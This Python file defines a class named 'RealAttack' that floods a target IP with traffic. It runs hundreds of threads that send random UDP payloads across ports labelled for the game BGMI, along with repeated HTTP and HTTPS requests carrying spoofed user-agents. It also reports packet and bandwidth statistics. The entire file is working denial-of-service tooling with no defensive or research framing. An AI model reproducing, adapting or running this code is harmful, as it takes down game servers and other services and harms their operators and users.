import socket
import threading
import random
import time
import ssl
import http.client

class RealAttack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
        self.start_time = 0
    
    def udp_flood(self, ip, port, end):
        sockets = []
        for _ in range(5):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
                s.settimeout(0.001)
                sockets.append(s)
            except:
                pass
        
        bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000]
        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(20)]
        
        while self.on and time.time() < end:
            try:
                for s in sockets:
                    for _ in range(20):
                        if not self.on:
                            break
                        target_port = random.choice(bgmi_ports)
                        payload = random.choice(payloads)
                        try:
                            s.sendto(payload, (ip, target_port))
                            with self.lock:
                                self.pkts += 1
                                self.bytes_out += len(payload)
                        except:
                            pass
                time.sleep(0.001)
            except:
                pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def http_flood(self, ip, port, end):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        paths = ['/', '/api', '/game', '/match', '/login']
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.on and time.time() < end:
            try:
                ua = random.choice(user_agents)
                path = random.choice(paths)
                headers = {'User-Agent': ua, 'Accept': 'text/html,*/*'}
                
                try:
                    conn = http.client.HTTPSConnection(ip, port, context=context, timeout=1)
                    conn.request('GET', path, headers=headers)
                    conn.getresponse()
                    with self.lock:
                        self.pkts += 1
                    conn.close()
                except:
                    try:
                        conn = http.client.HTTPConnection(ip, port, timeout=1)
                        conn.request('GET', path, headers=headers)
                        conn.getresponse()
                        with self.lock:
                            self.pkts += 1
                        conn.close()
                    except:
                        pass
                time.sleep(0.001)
            except:
                pass
    
    def start(self, ip, port, dur, threads=800):
        self.on = True
        self.pkts = 0
        self.bytes_out = 0
        self.start_time = time.time()
        
        end = time.time() + dur
        
        # 🔥 RAILWAY SAFE LIMIT
        if threads > 1000:
            threads = 800
        
        udp_t = int(threads * 0.6)
        http_t = int(threads * 0.4)
        
        workers = []
        
        for _ in range(udp_t):
            t = threading.Thread(target=self.udp_flood, args=(ip, port, end))
            t.daemon = True
            t.start()
            workers.append(t)
        
        for _ in range(http_t):
            t = threading.Thread(target=self.http_flood, args=(ip, port, end))
            t.daemon = True
            t.start()
            workers.append(t)
        
        time.sleep(dur)
        self.on = False
        
        for w in workers:
            try:
                w.join(timeout=0.5)
            except:
                pass
        
        elapsed = time.time() - self.start_time
        return {
            'pkts': self.pkts,
            'mb': self.bytes_out / 1024 / 1024,
            'mbps': (self.bytes_out * 8) / (elapsed * 1e6) if elapsed > 0 else 0,
            'pps': self.pkts / elapsed if elapsed > 0 else 0,
            'duration': dur
        }
